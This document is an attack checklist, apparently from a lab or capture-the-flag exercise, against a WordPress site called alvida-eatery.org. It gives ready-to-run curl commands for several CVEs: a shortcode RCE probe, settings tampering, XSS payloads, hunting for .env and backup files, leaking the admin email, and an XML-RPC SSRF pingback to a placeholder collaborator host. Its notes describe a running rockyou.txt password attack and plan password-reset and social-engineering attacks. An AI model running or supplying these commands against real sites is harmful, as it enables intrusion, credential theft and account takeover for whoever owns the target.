# Investigation Checklist - alvida-eatery.org

**Target:** 192.168.229.47 (alvida-eatery.org)
**Date:** 2025-09-29

---

## ⭐ HIGH PRIORITY - UNAUTHENTICATED EXPLOITS

### 1. Ocean-Extra Shortcode RCE (CVE-2025-3472)
**Version:** 2.0.1 (Fixed in 2.4.7)
**Type:** Unauthenticated Arbitrary Shortcode Execution → RCE

```bash
# Test shortcode processing
curl -X POST "http://alvida-eatery.org/" \
  -d "ocean_extra_shortcode=[do_shortcode code='phpinfo']"

# Try contact form shortcode
curl "http://alvida-eatery.org/?ocean_extra_shortcode=[contact-form-7]"

# Download plugin for source analysis
wget http://alvida-eatery.org/wp-content/plugins/ocean-extra/readme.txt
curl -s http://alvida-eatery.org/wp-content/plugins/ocean-extra/ | grep ".php"
```

**Indicators of Success:** PHP info output, shortcode execution, command output

---

### 2. Perfect Survey Alternate Exploits
**Version:** 1.5.1 (4 unauthenticated vulns)

```bash
# CVE-2021-24763 - AJAX settings manipulation
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" \
  -d "action=save_settings&survey_id=1&test=value"

# CVE-2021-24765 - Unauthenticated Stored XSS
curl -X POST "http://alvida-eatery.org/wp-admin/admin-ajax.php" \
  -d "action=get_question&question_id=1&xss=<script>alert(1)</script>"

# CVE-2021-24764 - Reflected XSS
curl "http://alvida-eatery.org/wp-content/plugins/perfect-survey/pages/survey.php?id=1&xss=<script>alert(1)</script>"
```

**Indicators of Success:** Settings changed, XSS payload reflected/stored, different response

---

### 3. Directory Listing Enumeration
**Plugins with listing enabled:** Elementor, WPForms

```bash
# Enumerate Elementor for sensitive files
curl -s http://alvida-eatery.org/wp-content/plugins/elementor/ | grep -E "href.*\.(php|txt|sql|bak|log|conf)"

# Enumerate WPForms
curl -s http://alvida-eatery.org/wp-content/plugins/wpforms-lite/ | grep -E "href.*\.(php|txt|sql|bak|log|conf)"

# Look for backups
curl -I http://alvida-eatery.org/wp-content/plugins/elementor/config.php.bak
curl -I http://alvida-eatery.org/wp-content/plugins/wpforms-lite/.env
```

**Indicators of Success:** Config files, backups, logs, credentials found

---

## 📊 MEDIUM PRIORITY - INFORMATION DISCLOSURE

### 4. WP-Cron Enumeration
```bash
# Check cron endpoint
curl -v http://alvida-eatery.org/wp-cron.php

# Look for scheduled tasks
curl -s http://alvida-eatery.org/wp-cron.php?doing_wp_cron | grep -E "(path|user|pass|key|token)"
```

**Indicators of Success:** Internal paths revealed, credentials exposed, task details

---

### 5. Admin Email Disclosure (CVE-2023-5561)
**Version:** WP 6.0 (Fixed in 6.0.6)

```bash
# REST API email leak
curl -s "http://alvida-eatery.org/?rest_route=/wp/v2/users/1" | python3 -m json.tool | grep -E "(email|name)"

# Alternative method
curl -s "http://alvida-eatery.org/wp-json/wp/v2/users/1" | grep email
```

**Indicators of Success:** admin@alvida-eatery.org or similar email revealed

---

### 6. Akismet Version Check
```bash
# Determine version
curl -s http://alvida-eatery.org/wp-content/plugins/akismet/readme.txt | grep "Stable tag"

# If version < 3.1.5, test CVE-2015-9357 XSS
curl -X POST "http://alvida-eatery.org/wp-comments-post.php" \
  -d "comment=<script>alert(1)</script>&akismet_test=1"
```

**Indicators of Success:** Version < 3.1.5 = exploitable XSS

---

## 🔬 ADVANCED - REQUIRES TOOLING

### 7. WordPress SSRF (CVE-2022-3590)
**Version:** WP 6.0 (Vulnerable <= 6.2)
**Requires:** Burp Collaborator or webhook.site

```bash
# Test pingback SSRF
curl -X POST http://alvida-eatery.org/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://YOUR-COLLABORATOR.com</string></value></param>
<param><value><string>http://alvida-eatery.org/</string></value></param>
</params>
</methodCall>'
```

**Indicators of Success:** Request received at collaborator domain

---

## 📝 TESTING ORDER

1. ✅ **Ocean-Extra Shortcode RCE** (highest impact, no public PoC)
2. ✅ **Directory Listings** (quick wins for credentials/configs)
3. ✅ **Perfect Survey Alternate Vectors** (multiple unauthenticated exploits)
4. ✅ **Admin Email Disclosure** (social engineering vector)
5. ✅ **WP-Cron Enumeration** (may reveal secrets)
6. ✅ **Akismet Version/XSS** (if old version detected)
7. ✅ **SSRF Testing** (advanced, requires external tools)

---

## 🚩 SUCCESS CRITERIA

- **Credentials found** in directory listings
- **Shortcode execution** confirmed via Ocean-Extra
- **Admin email** obtained for password reset attacks
- **XSS payload** stored/reflected via Perfect Survey
- **Internal paths/secrets** leaked via wp-cron

---

## 📌 NOTES

- Background rockyou.txt password attack still running
- Perfect Survey SQLi blocked by 404 response (documented)
- All authenticated exploits deferred until credentials obtained